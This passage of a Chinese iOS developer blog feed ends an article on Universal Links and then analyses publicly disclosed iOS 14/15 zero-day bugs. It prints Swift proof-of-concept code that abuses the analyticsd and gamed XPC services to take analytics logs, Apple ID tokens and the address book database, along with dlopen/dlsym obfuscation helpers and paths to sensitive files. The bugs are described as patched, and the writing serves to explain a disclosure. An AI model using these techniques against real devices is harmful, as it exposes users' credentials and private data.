src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/08bef4825f7544a281f08932cea3331a~tplv-k3u1fbpfcp-watermark.image" alt="iOSUniversalLink-34.jpeg"><br>现在，苹果默认提供了常用的变量，举例来说，用 <code>$(alpha)</code> 来表示 <code>[ &quot;A&quot;,&quot;a&quot;, &quot;B&quot;, &quot;b&quot;, &quot;C&quot;, ... &quot;Z&quot;, &quot;z&quot; ]</code> 内任意的字符。其它同理。</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/5c86f9d06a764538b203ae5898a80915~tplv-k3u1fbpfcp-watermark.image" alt="iOSUniversalLink-35.jpeg"><br>举例来说，通过字段 <code>&quot;substitutionVariables&quot;:</code> 来自定义字符集，然后可以套用到 <code>&quot;components&quot;:</code> 里，用 <code>$()</code> 来包含替换。</p><p>如上图中，<code>&quot;/$(lang)_CA/$(Canadian food)/&quot;, &quot;percentEncoded&quot;: false</code> 表示匹配任意语言的加拿大下的 <code>Canadian food</code> 包含的产品，并且是用 Unicode 编码，因为最后一个产品是 <code>&quot;tête-de-violon&quot;</code> 非英文字符。同理，第二个包含 <code>&quot;exclude&quot;: true</code>，表示排除此路径。</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/3efd6541a7484546af6ed1257f29b8b6~tplv-k3u1fbpfcp-watermark.image" alt="iOSUniversalLink-36.jpeg"><br>原来的 Universal Link 默认是用户安装应用时就通过 App 里配置的 URL 请求 <code>apple-app-site-association</code> 配置文件内容。但可能因为开发者网站的部署距离用户远近不同，导致访问速度无法保障，所以，苹果改为通过 Apple CDN 来请求 apple-app-site-association 配置文件并缓存起来，来针对不用地区的用户，加速配置文件的获取。</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/43d33cbe5aba46e4ae481674b577919c~tplv-k3u1fbpfcp-watermark.image" alt="iOSUniversalLink-37.jpeg"><br>最后，苹果提供绕过 CDN 下载配置文件的方法，也是方便开发者进行测试 Universal Link。具体来说，就是在设置中的 <code>Developer</code> 下 <code>Associated Domains Development</code>，然后在 Xcode 配置 <code>associated-domains</code> Universal Link 链接时，拼接 <code>?mode=developer</code>，这样表示开发者模块，此时的 Universal Link 可以是内网部署，不需要外网部署，非常的方便调试。</p><h3 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h3><p>最后，我们从产品的角度来总结一下 <code>URL Scheme</code> 和 <code>Universal Link</code> 的功能发展。</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/9e78fbeb5b754894997adcbbd88e271a~tplv-k3u1fbpfcp-watermark.image" alt="iOSUniversalLink-39.jpeg"></p><p>URL Scheme 从最初的打破 App 之间无联系的沟通，到效率工具 App 的重度依赖，其中 Workflow App 当年最为流行，后来被苹果收购。正好刚刚说的，被苹果收购后可以获取更多的系统级权限，其实对于效率类 App 是非常利好的！后来，苹果把 Workflow 改名 Shortcuts（捷径），并且能与 Siri 交互。</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/fc6ca235e0164263be2d40966f00f5fc~tplv-k3u1fbpfcp-watermark.image" alt="iOSUniversalLink-40.jpeg"><br>举例来说，Shortcuts 能读取 NFC 卡的权限，并且可以打开所有的 App！不需要依赖 URL Scheme，打开所有的 App！所以，URL Scheme 的作用，对于 Shortcuts 来说，根本不需要依赖了。</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/890db8adf548465fbd739ec63d9f08cd~tplv-k3u1fbpfcp-watermark.image" alt="iOSUniversalLink-41.jpeg"><br>当然，快捷打开 App，不得不说到 3D Touch，可能从苹果来说，这是一个创新的交互方式，但是用户并没有习惯起来。隐藏式的交互设计，客观来讲，对于用户体验确实不友好。</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/4588b4d90578461ea3b7ff15fb2e237f~tplv-k3u1fbpfcp-watermark.image" alt="iOSUniversalLink-42.jpeg"><br>当然，最后 URL Scheme 还是会长存！因为第三方 App 之间无法直接交互。除了交互，就是打开 App 某个功能或者路径，利用 PWA 添加到主屏幕也是一种方案，但是对于一般用户需要教导，不太好推广。</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/296bdbdba04e43ad95953757c6cf8579~tplv-k3u1fbpfcp-watermark.image" alt="iOSUniversalLink-43.jpeg"><br>最后，Universal Link 总结来说，通用性、安全性、灵活性、隐私性，对于开发者来说，其他人无法伪造，所以的配置都由开发者来掌握。简单来说，通过域名和后台控制，可以随时调整，对用户无影响。</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/1ef264711d594915aa06cc9a85947ec8~tplv-k3u1fbpfcp-watermark.image" alt="iOSUniversalLink-44.jpeg"><br>举例来说，知乎在 web 页面，利用 Universal Link 显示 “App 内打开”，而顶部是利用 <a href="https://developer.apple.com/documentation/webkit/promoting_apps_with_smart_app_banners">Smart App Banners</a> 在用户安装 App 和未安装 App 时，展示打开或者显示（点击时打开 App，或者打开 AppStore 显示）。当然，知乎还用了 URL Scheme 兜底，最后，就是显示 Universal Link 的引导安装的 web 落地页面。</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/1d61ec59f68f439b9794f09686f028d6~tplv-k3u1fbpfcp-watermark.image" alt="iOSUniversalLink-45.jpeg"></p><p>Handoff 也需要使用 Universal Link 的配置文件来验证权限，Shared Web Credentials 也是优化 web 和 app 之间共享账号登陆。</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/9fad60c9659f4fe1bd36e5fc3846b7ed~tplv-k3u1fbpfcp-watermark.image" alt="iOSUniversalLink-46.jpeg"></p><p>去年苹果推出的小程序 <a href="https://developer.apple.com/videos/play/wwdc2020/10146/">App Clips</a>（轻 App）也是使用 apple-app-site-association 来配置权限。</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c92d7fc35e5046ae842ee41ce9a437bf~tplv-k3u1fbpfcp-watermark.image" alt="iOSUniversalLink-47.jpeg"></p><p>今年推出的 <a href="https://developer.apple.com/videos/play/wwdc2021/10171">in-app events</a> AppStore 商店 App 内事件功能，也需要配置 Universal Link 。</p><p>最后的总结，我们说了 URL Scheme 和 Universal Link 的来历，从目前来说，Universal Link 并不能完全替换 URL Scheme，但 Universal Link 因为其优点，苹果把越来越多的功能权限验证，放到了 Universal Link 配置上，相信未来还会有更多 Universal Link。所以，了解这些功能的出现的背后原因和解决的问题，对于我们掌握事物都有帮助，希望大家有所收获，如果觉得可以，欢迎点赞转发啊~</p><p>欢迎大家一起在评论区交流~</p><blockquote><p>欢迎关注我们，了解更多 iOS 和 Apple 的动态~</p></blockquote><h3 id="四、参考引用"><a href="#四、参考引用" class="headerlink" title="四、参考引用"></a>四、参考引用</h3><ul><li><a href="https://developer.apple.com/library/archive/featuredarticles/iPhoneURLScheme_Reference/Introduction/Introduction.html#//apple_ref/doc/uid/TP40007899-CH1-SW1">About Apple URL Schemes</a></li><li><a href="https://sspai.com/post/31500">URL Schemes 使用详解 - 少数派</a></li><li><a href="https://sspai.com/post/44591">入门 iOS 自动化：读懂 URL Schemes - 少数派</a></li><li><a href="https://developers.weixin.qq.com/community/develop/doc/00062412e00e4878f8290f35457801">微信开放平台发布新版本SDK，请开发者尽快更新 | 微信开放社区</a></li><li><a href="https://developer.apple.com/library/archive/documentation/General/Conceptual/AppSearch/UniversalLinks.html#//apple_ref/doc/uid/TP40016308-CH12-SW1">App Search Programming Guide: Support Universal Links</a></li><li><a href="https://developer.apple.com/ios/universal-links/">Universal Links - Apple Developer</a></li><li><a href="https://developer.apple.com/documentation/xcode/supporting-universal-links-in-your-app">Supporting Universal Links in Your App | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/documentation/xcode/allowing-apps-and-websites-to-link-to-your-content">Allowing Apps and Websites to Link to Your Content | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/videos/play/wwdc2020/10098/">What’s new in Universal Links - WWDC20</a></li><li><a href="https://developer.apple.com/videos/play/wwdc2019/717/">What’s New in Universal Links - WWDC19</a></li><li><a href="https://developer.apple.com/videos/play/wwdc2017/250/">Extend Your App’s Presence with Deep Linking - WWDC17</a></li><li><a href="https://xiaozhuanlan.com/topic/3019548672">Universal Links 新特性 － 小专栏</a></li><li><a href="https://xiaozhuanlan.com/topic/1973850246">WWDC20 10098 - What’s new in Universal Links － 小专栏</a></li><li><a href="https://help.apple.com/workflow/">Workflow Help</a></li><li><a href="https://support.apple.com/zh-cn/guide/shortcuts/welcome/ios">快捷指令使用手册 - Apple 支持</a></li><li><a href="https://developer.apple.com/documentation/webkit/promoting_apps_with_smart_app_banners">Promoting Apps with Smart App Banners | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/videos/play/wwdc2020/10146/">Configure and link your App Clips - WWDC20 - Videos - Apple Developer</a></li><li><a href="https://developer.apple.com/videos/play/wwdc2021/10171">Meet in-app events on the App Store - WWDC21 - Videos - Apple Developer</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文首发于 &lt;a href=&quot;https://juejin.cn/post/7041091910626181157&quot;&gt;趣谈 iOS Universal Link - 掘金&lt;/a&gt;，欢迎关注我们 &lt;a href=&quot;https://juejin.cn/user/1002387318511214&quot;&gt;@37手游iOS技术运营团队&lt;/a&gt; 。&lt;/p&gt;</summary>
    
    
    
    <category term="technology" scheme="https://ihtcboy.com/categories/technology/"/>
    
    
    <category term="iOS" scheme="https://ihtcboy.com/tags/iOS/"/>
    
    <category term="Universal Link" scheme="https://ihtcboy.com/tags/Universal-Link/"/>
    
    <category term="URL Scheme" scheme="https://ihtcboy.com/tags/URL-Scheme/"/>
    
  </entry>
  
  <entry>
    <title>iOS15 安全漏洞分析：价值10万美元的漏洞曝光</title>
    <link href="https://ihtcboy.com/2021/10/18/2021-10-18_iOS15%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%9A%E4%BB%B7%E5%80%BC10%E4%B8%87%E7%BE%8E%E5%85%83%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%9B%9D%E5%85%89/"/>
    <id>https://ihtcboy.com/2021/10/18/2021-10-18_iOS15%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%9A%E4%BB%B7%E5%80%BC10%E4%B8%87%E7%BE%8E%E5%85%83%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%9B%9D%E5%85%89/</id>
    <published>2021-10-18T00:55:16.000Z</published>
    <updated>2022-02-13T15:06:31.382Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于 <a href="https://juejin.cn/post/7020201677072367623">iOS15 安全漏洞分析：价值10万美元的漏洞曝光 - 掘金</a>，欢迎关注我们 <a href="https://juejin.cn/user/1002387318511214">@37手游iOS技术运营团队</a> 。</p><span id="more"></span><h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h3><p>大家好，今天我们一起来吃一个苹果系统漏洞的大瓜！</p><p>事情是这样的，9 月 24 号 Denis Tokarev 发表文章公开披露 4 个 0-day iOS 漏洞，吐槽苹果没有署名感谢，最关键是苹果没有给赏金！</p><p>以下是作者的信息：</p><ul><li>Twitter：<a href="https://twitter.com/illusionofcha0s">Denis Tokarev</a></li><li>GitHub：<a href="https://github.com/illusionofchaos">illusionofchaos</a></li><li>披露文章：<a href="https://habr.com/ru/post/579714/">Disclosure of three 0-day iOS vulnerabilities and critique of Apple Security Bounty program / Хабр</a></li></ul><h3 id="二、事件始末"><a href="#二、事件始末" class="headerlink" title="二、事件始末"></a>二、事件始末</h3><p>从 Twitter 可知 illusionofchaos 为化名的研究人员真名是 Denis Tokarev（丹尼斯·托卡列夫），目前关于 Denis Tokarev 个人资料并不多，通过其使用俄语的网页披露漏洞，猜测他是俄罗斯人。</p><p>作者称在今年 3 月 10 日 ~ 5 月 4 日之间给苹果报告了 4 个 0-day 漏洞，但到发文为止，只在 iOS 14.7 修复了一个，但苹果在 <a href="https://support.apple.com/zh-cn/HT212601">iOS 14.7 安全性内容</a> 更新页面并没有披露出来！当作者向苹果(Apple Product Security)提出质疑时，他们承诺在下一次系统版本更新的页面中列出，但此后的三次版本发布都没有列出。所以作者怒了！决定披露出来！才有了今天这个惊天动地的新闻(大瓜)!</p><p><strong>0-day 漏洞</strong></p><p><code>0day</code>，zero-day vulnerability，0-day vulnerability，零日漏洞或零时差漏洞。</p><p><a href="https://zh.wikipedia.org/wiki/%E9%9B%B6%E6%97%A5%E6%94%BB%E5%87%BB">零日攻击</a> 指被发现后立即被恶意利用的安全漏洞。通俗地讲，即安全补丁与瑕疵曝光的同一日内，相关的恶意程序就出现。由原软件发行公司提供修补程序，但此法通常较慢，因此软件公司通常会在最新的病毒代码中提供回避已知零时差攻击的功能，但无法彻底解决漏洞本身。这种攻击往往具有很大的突发性与破坏性。</p><blockquote><p>小编注：</p><p>iOS 14.7 发布于 2021 年 7 月 19 日；<br>在作者发文后 2021年 10 月 11 日，苹果发布 iOS 15.0.2 ，又修复了一个漏洞。</p></blockquote><p>接下来，我们先分析这 4 个漏洞的危害，然后在讨论关于苹果安全赏金计划，最后，在一些探讨一下关于 iOS 安全性。</p><h4 id="iOS-Analyticsd-pre-14-7-exploit"><a href="#iOS-Analyticsd-pre-14-7-exploit" class="headerlink" title="iOS Analyticsd pre-14.7 exploit"></a>iOS Analyticsd pre-14.7 exploit</h4><blockquote><p>漏洞在 iOS 14.7 已修复。</p></blockquote><p><strong>漏洞作用</strong></p><p>允许任何用户安装的 app 访问分析日志（设置-&gt;隐私-&gt;分析和改进-&gt;分析数据 中的日志），这些日志包含(但不仅限于)：</p><ul><li>医疗信息（心率、检测到的心房颤动计数和心律不齐事件）</li><li>月经周期长度、生理性别和年龄、用户是否记录性活动、宫颈粘液质量等。</li><li>设备使用信息（不同情况下的设备取货、推送通知计数和用户操作等）</li><li>所有具有各自 bundle ID 的应用程序的屏幕使用时间信息和会话计数</li><li>有关设备配件及其制造商、型号、固件版本和用户分配名称的信息</li><li>应用程序崩溃时带有 bundle ID 和异常代码</li><li>用户在 Safari 浏览器中查看的网页语言</li></ul><p><strong>漏洞说明</strong></p><p>此漏洞是不需要任何权限，app 就可以获取分析日志，而分析日志是每个系统都会有，肯定会存在敏感的信息。同时，作者表示即使在设置中关闭“共享分析”，所有这些数据仍在收集中。关于这点，小编没有进行验证，有兴趣的朋友可以验证一下。</p><p>此漏洞在 iOS 14.7 已经修复，所以，小编在 iOS 14.2 设备上测试，其中有一组名为 <code>MotionUsageMetrics</code> 数据：</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/36f0f6962f06443593a32d806b201493~tplv-k3u1fbpfcp-watermark.image" alt="iOS-exploit-01.png"></p><p>这个数据应该是每个 app 调用 Motion（陀螺仪）的数据。</p><p><strong>漏洞代码</strong></p><p>漏洞攻击示例源代码：<a href="https://github.com/illusionofchaos/ios-analyticsd-pre14.7-exploit">GitHub</a></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">analyticsJson</span>()</span> -&gt; <span class="type">String</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> connection <span class="operator">=</span> xpc_connection_create_mach_service(<span class="string">&quot;com.apple.analyticsd&quot;</span>, <span class="literal">nil</span>, <span class="number">2</span>)</span><br><span class="line">    xpc_connection_set_event_handler(connection, &#123; <span class="keyword">_</span> <span class="keyword">in</span> &#125;)</span><br><span class="line">    xpc_connection_resume(connection)</span><br><span class="line">    <span class="keyword">let</span> xdict <span class="operator">=</span> xpc_dictionary_create(<span class="literal">nil</span>, <span class="literal">nil</span>, <span class="number">0</span>)</span><br><span class="line">    xpc_dictionary_set_string(xdict, <span class="string">&quot;command&quot;</span>, <span class="string">&quot;log-dump&quot;</span>)</span><br><span class="line">    <span class="keyword">let</span> reply <span class="operator">=</span> xpc_connection_send_message_with_reply_sync(connection, xdict)</span><br><span class="line">    <span class="keyword">return</span> <span class="type">String</span>(cString: xpc_dictionary_get_string(reply, <span class="string">&quot;log-dump&quot;</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>XPC</strong></p><p>这里先解析一下 <code>XPC</code> ，XPC 是 macOS 和 iOS 当中一种基于 Mach 消息的 IPC (进程间通信) 技术, 它实现了权限隔离, 使得 App Sandbox 更加完备。需要注意的是，在 iOS 上是私有 API。简单来说，就是系统封装了很多 XPC 服务，一个 XPC 提供了进程间通信的服务，所有的 app 都可以访问这个服务。详细 API 功能和说明，可以参考以下链接：</p><ul><li><a href="https://developer.apple.com/documentation/xpc/">XPC | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/documentation/xpc/xpc_connections/">XPC Connections | Apple Developer Documentation</a></li><li><a href="https://www.objc.io/issues/14-mac/xpc/">XPC · objc.io</a></li><li><a href="https://objccn.io/issue-14-4/">ObjC 中国 - XPC</a></li></ul><p><strong>漏洞分析</strong></p><p>了解了 XPC 基本概念，上面的源代码，大家应该能猜到一些了。就是通过苹果系统的 XPC 服务 <code>com.apple.analyticsd</code>，因苹果没有验证权限，导致所有 app 都可以访问这个 XPC 服务。</p><p>源代码解读：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">analyticsJson</span>()</span> -&gt; <span class="type">String</span> &#123;</span><br><span class="line">    <span class="comment">// 建议 com.apple.analyticsd 的 XPC 连接</span></span><br><span class="line">    <span class="keyword">let</span> connection <span class="operator">=</span> xpc_connection_create_mach_service(<span class="string">&quot;com.apple.analyticsd&quot;</span>, <span class="literal">nil</span>, <span class="number">2</span>)</span><br><span class="line">    <span class="comment">// 处理 connection 的各种事件</span></span><br><span class="line">    xpc_connection_set_event_handler(connection, &#123; <span class="keyword">_</span> <span class="keyword">in</span> &#125;)</span><br><span class="line">    <span class="comment">// 必须调用 resume 方法来启动</span></span><br><span class="line">    xpc_connection_resume(connection)</span><br><span class="line">    <span class="comment">// 创建一个XPC参数传递字典</span></span><br><span class="line">    <span class="keyword">let</span> xdict <span class="operator">=</span> xpc_dictionary_create(<span class="literal">nil</span>, <span class="literal">nil</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="comment">// 键是 command, 值是 log-dump</span></span><br><span class="line">    xpc_dictionary_set_string(xdict, <span class="string">&quot;command&quot;</span>, <span class="string">&quot;log-dump&quot;</span>)</span><br><span class="line">    <span class="comment">// 发送消息</span></span><br><span class="line">    <span class="keyword">let</span> reply <span class="operator">=</span> xpc_connection_send_message_with_reply_sync(connection, xdict)</span><br><span class="line">    <span class="comment">// 读取结果</span></span><br><span class="line">    <span class="keyword">return</span> <span class="type">String</span>(cString: xpc_dictionary_get_string(reply, <span class="string">&quot;log-dump&quot;</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果需要运行源代码，需要注意，项目中的 <code>c.c</code> 代码文件中 c 函数方法需要修改成这样：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> * <span class="title">normal_function1</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> * arg1, <span class="keyword">int</span> arg2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">void</span> *(*)(<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">int</span>))((<span class="keyword">long</span> <span class="keyword">long</span>)dlopen))(arg1, arg2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> * <span class="title">normal_function2</span><span class="params">(<span class="keyword">void</span> * arg1, <span class="keyword">const</span> <span class="keyword">char</span> * arg2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">void</span> *(*)(<span class="keyword">void</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *))((<span class="keyword">long</span> <span class="keyword">long</span>)dlsym))(arg1, arg2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>为什么这样改，下文会有进一步的解析。</p><p><strong>报告时间表</strong></p><ul><li>2021年4月29日：给苹果发送了一份详细报告</li><li>2021年4月30日：苹果回复说，他们已经审查了该报告并接受了调查</li><li>2021年5月20日：求苹果公司更新状态（但没有收到任何回复）</li><li>2021年5月30日：要求苹果更新状态</li><li>2021年6月3日：苹果回复说，他们计划在即将到来的更新中解决这个问题</li><li>2021年7月19日：iOS 14.7 发布并修复</li><li>2021年7月20日：我已请求苹果更新状态</li><li>2021 年7月21日：iOS 14.7 安全内容列表已发布，未提及此漏洞 (<a href="https://support.apple.com/zh-cn/HT212601">https://support.apple.com/zh-cn/HT212601</a>)</li><li>2021年7月22日：问了苹果一个问题，为什么漏洞不在列表中</li><li>同一天，我收到以下回复：<strong>由于处理问题，您的贡献将在即将发布的更新中包含在安全页面中。对于给您带来的不便，我们深表歉意。</strong></li><li>2021年7月26日：iOS 14.7.1 安全性内容列表已发布，仍未提及此漏洞（<a href="https://support.apple.com/zh-cn/HT212623%EF%BC%89">https://support.apple.com/zh-cn/HT212623）</a></li><li>2021年9月13日：iOS 14.8 安全内容列表已发布，仍未提及此漏洞（<a href="https://support.apple.com/zh-cn/HT212807%EF%BC%89%E5%90%8C%E4%B8%80%E5%A4%A9%EF%BC%8C%E6%88%91%E8%A6%81%E6%B1%82%E8%A7%A3%E9%87%8A%EF%BC%8C%E5%B9%B6%E5%91%8A%E7%9F%A5%E8%8B%B9%E6%9E%9C%EF%BC%8C%E9%99%A4%E9%9D%9E%E6%88%91%E5%BE%88%E5%BF%AB%E6%94%B6%E5%88%B0%E5%9B%9E%E5%A4%8D%EF%BC%8C%E5%90%A6%E5%88%99%E6%88%91%E4%BC%9A%E5%85%AC%E5%BC%80%E6%88%91%E7%9A%84%E6%89%80%E6%9C%89%E7%A0%94%E7%A9%B6%E3%80%82">https://support.apple.com/zh-cn/HT212807）同一天，我要求解释，并告知苹果，除非我很快收到回复，否则我会公开我的所有研究。</a></li><li>2021年9月20日：iOS 15.0 安全内容列表已发布，仍未提及此漏洞（<a href="https://support.apple.com/zh-cn/HT212814%EF%BC%89">https://support.apple.com/zh-cn/HT212814）</a></li><li>2021年9月24日：我仍然没有收到任何回复</li></ul><p>从这长长的报告时间，没有得到苹果兑现承诺，可以感受到做出的贡献却没有得到表扬，对于作者是一件痛苦的事件。</p><h4 id="iOS-gamed-exploit-fixed-in-15-0-2"><a href="#iOS-gamed-exploit-fixed-in-15-0-2" class="headerlink" title="iOS gamed exploit (fixed in 15.0.2)"></a>iOS gamed exploit (fixed in 15.0.2)</h4><blockquote><p>漏洞在 iOS 15.0.2 已修复。</p></blockquote><p><strong>漏洞作用</strong></p><p>从 App Store 安装的任何 app 都可以不需要用户允许的情况下访问以下数据：</p><ul><li>Apple ID 电子邮件及其关联的全名</li><li>Apple ID 身份验证令牌，允许代表用户访问 *.apple.com 上的至少一个端点</li><li>完整的文件系统读取对 Core Duet 数据库的访问权限（包含来自邮件、短信、iMessage、第三方 app 转发的联系人列表，以及所有用户与这些联系人互动的元数据（包括时间戳和统计数据），以及一些附件（如URL和文本））</li><li>完整的文件系统读取对 Speed Dial 数据库和 Address Book(通讯录) 数据库的访问，包括联系人头像和其他元数据，如创建和修改日期（我刚刚在 iOS 15 上检查过，这个无法访问，所以最近肯定已经悄悄修复了）</li></ul><p><strong>漏洞说明</strong></p><p>这个漏洞，不需要任何权限，即可读取 Core Duet、 Speed Dial 和 Address Book(通讯录) 数据库内容。而如果需要读取用户的 Apple ID 电子邮件，则需要在 设置 -&gt; GameCenter 打开时，才能读取到。</p><p>运行示例：</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/40053cf25c51424b8d15207f4b8f8113~tplv-k3u1fbpfcp-watermark.image" alt="iOS-exploit-02.png"></p><p>这里只展示了获取 Apple ID 数据的截图，此漏洞还可以获取全部的通讯录，所有的联系人名字和电话号码，你的人脉关系链瞬间就这样给别人获取，所以，这个漏洞的危害性还是很大。</p><p><strong>漏洞代码</strong></p><p>漏洞攻击示例源代码：<a href="https://github.com/illusionofchaos/ios-gamed-0day">GitHub</a></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> connection <span class="operator">=</span> <span class="type">NSXPCConnection</span>(machServiceName: <span class="string">&quot;com.apple.gamed&quot;</span>, options: <span class="type">NSXPCConnection</span>.<span class="type">Options</span>.privileged)<span class="operator">!</span></span><br><span class="line"><span class="keyword">let</span> proxy <span class="operator">=</span> connection.remoteObjectProxyWithErrorHandler(&#123; <span class="keyword">_</span> <span class="keyword">in</span> &#125;) <span class="keyword">as!</span> <span class="type">GKDaemonProtocol</span></span><br><span class="line"><span class="keyword">let</span> pid <span class="operator">=</span> <span class="type">ProcessInfo</span>.processInfo.processIdentifier</span><br><span class="line">proxy.getServicesForPID(pid, localPlayer: <span class="literal">nil</span>, reply: &#123; (accountService, <span class="keyword">_</span>, <span class="keyword">_</span>, <span class="keyword">_</span>, <span class="keyword">_</span>, <span class="keyword">_</span>, <span class="keyword">_</span>, <span class="keyword">_</span>, utilityService, <span class="keyword">_</span>, <span class="keyword">_</span>, <span class="keyword">_</span>, <span class="keyword">_</span>) <span class="keyword">in</span></span><br><span class="line">accountService.authenticatePlayerWithExistingCredentials(handler: &#123; response, error <span class="keyword">in</span></span><br><span class="line"><span class="keyword">let</span> appleID <span class="operator">=</span> response.credential.accountName</span><br><span class="line"><span class="keyword">let</span> token <span class="operator">=</span> response.credential.authenticationToken</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">utilityService.requestImageData(for: <span class="type">URL</span>(fileURLWithPath: <span class="string">&quot;/var/mobile/Library/AddressBook/AddressBook.sqlitedb&quot;</span>), subdirectory: <span class="literal">nil</span>, fileName: <span class="literal">nil</span>, handler: &#123; data <span class="keyword">in</span></span><br><span class="line"><span class="keyword">let</span> addressBookData <span class="operator">=</span> data</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>漏洞分析</strong></p><p>漏洞的根本原因是因为 XPC 服务 <code>com.apple.gamed</code> 未正确检查 app 是否有 <code>com.apple.developer.game-center</code> 权限导致。</p><p>1、即使在用户设备上禁用了 Game Center，调用 <code>getServicesForPID:localPlayer:reply:</code> 方法也会返回几个 XPC 代理对象（<code>GKAccountService</code>、<code>GKFriendService</code>、<code>GKUtilityService</code> 等）。</p><p>2、如果在用户设备上启用了 Game Center（即使它没有在苹果后台 App Store Connect 中为 app 启用此权限，并且 app 中不包含 <code>com.apple.developer.game-center</code> 授权）。</p><ul><li>在 <code>GKAccountService</code> 上调用<code>authenticatePlayerWithExistingCredentialsWithHandler:</code> 会返回一个包含 Apple ID 的对象用户、DSID 和 Game Center 身份验证令牌（允许代表用户向 <a href="https://gc.apple.com/">https://gc.apple.com</a> 发送请求）。</li><li>在 <code>GKProfileService</code> 上调用 <code>getProfilesForPlayerIDs:handler:</code> 会返回一个包含用户 Apple ID 名字和姓氏的对象。</li><li>在 <code>GKFriendService</code> 上调用 <code>getFriendsForPlayer:handler:</code> 返回一个对象，其中包含有关用户在 Game Center 中的朋友的信息。</li></ul><p>3、即使设备上 Game Center 被禁用，也没有在苹果后台为 App Store Connect 中的 app 启用此权限，并且 app 不包含 <code>com.apple.developer.game-center</code> 授权。调用 <code>GKUtilityService</code> 的 <code>requestImageDataForURL:subdirectory:fileName:handler:</code> 允许在应用程序沙箱之外，读取任意文件通过将文件 URL 传递给该方法。可以通过这种方式访问的文件（但不限于）如下： </p><ul><li><code>/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist</code>：包含设置中 “关于手机” 中的信息。越狱设备可以通过修改此文件，实现修改设备版本号、把日版美版等设备修改为国行等。</li><li><code>/var/mobile/Library/CoreDuet/People/interactionC.db</code>：包含来自邮件、短信、iMessage、第三方app 传递的联系人列表以及有关用户与这些联系人交互的元数据（包括时间戳和统计数据）</li><li><code>/var/mobile/Library/Preferences/com.apple.mobilephone.speeddial.plist</code>：包含个人收藏的联系人信息及其电话号码。</li><li><code>/var/mobile/Library/AddressBook/AddressBook.sqlitedb</code>：包含完整的通讯录信息。</li><li><code>/var/mobile/Library/AddressBook/AddressBookImages.sqlitedb</code>：包含通讯录联系人的头像。</li></ul><p>在 <code>GKUtilityService</code> 上调用 